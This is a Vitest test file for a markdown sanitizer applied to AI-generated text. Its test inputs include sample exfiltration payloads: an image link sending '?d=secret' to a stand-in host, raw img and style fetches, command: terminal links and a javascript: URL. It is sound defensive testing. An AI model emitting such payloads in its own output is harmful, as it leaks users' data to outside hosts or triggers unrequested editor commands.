import { describe, expect, it } from 'vitest';
import { sanitizeAiMarkdown } from '../src/ai/sanitize';

describe('sanitizeAiMarkdown', () => {
  it('turns images into their alt text, so nothing is fetched', () => {
    expect(sanitizeAiMarkdown('See ![diagram](https://evil.example/x.png?d=secret) here')).toBe(
      'See [image: diagram] here',
    );
    expect(sanitizeAiMarkdown('![](https://evil.example/p)')).toBe('[image]');
    // Reference-style and nested images cannot form either.
    expect(sanitizeAiMarkdown('![x][ref]\n\n[ref]: https://evil.example/p')).toBe(
      '!\\[x][ref]\n\n[ref]: https://evil.example/p',
    );
  });

  it('shows raw HTML and autolinks as text', () => {
    expect(sanitizeAiMarkdown('<img src="https://evil.example/p">')).toBe(
      '&lt;img src="https://evil.example/p">',
    );
    expect(sanitizeAiMarkdown('a <style>body{background:url(x)}</style> b')).toBe(
      'a &lt;style>body{background:url(x)}&lt;/style> b',
    );
    expect(sanitizeAiMarkdown('<https://example.com>')).toBe('&lt;https://example.com>');
    // A comparison is not a tag.
    expect(sanitizeAiMarkdown('if a < b and 2<3')).toBe('if a < b and 2<3');
  });

  it('keeps web and mail links, and disarms every other target', () => {
    expect(sanitizeAiMarkdown('[docs](https://example.com/a "t")')).toBe(
      '[docs](https://example.com/a "t")',
    );
    expect(sanitizeAiMarkdown('[mail](mailto:a@b.c)')).toBe('[mail](mailto:a@b.c)');
    expect(sanitizeAiMarkdown('[run](command:workbench.action.terminal.new)')).toBe(
      '[run] (command:workbench.action.terminal.new)',
    );
    expect(sanitizeAiMarkdown('[x](javascript:alert(1))')).toContain('[x] (javascript:alert(1)');
    expect(sanitizeAiMarkdown('[x]: command:evil')).toBe('\\[x]: command:evil');
  });

  it('leaves code blocks and code spans exactly as written', () => {
    const fenced = '```html\n<img src="x"> ![a](b)\n```';
    expect(sanitizeAiMarkdown(fenced)).toBe(fenced);
    const tilde = '~~~\n<b>bold</b>\n~~~\nafter <b>';
    expect(sanitizeAiMarkdown(tilde)).toBe('~~~\n<b>bold</b>\n~~~\nafter &lt;b>');
    expect(sanitizeAiMarkdown('use `<div>` and ``![x](y)`` but not <div>')).toBe(
      'use `<div>` and ``![x](y)`` but not &lt;div>',
    );
  });

  it('leaves ordinary explanations untouched', () => {
    const text =
      '# Fix crash\n\n- **What changed:** `parse()` now checks bounds.\n- Why: see [#12](https://github.com/o/r/issues/12).';
    expect(sanitizeAiMarkdown(text)).toBe(text);
  });
});
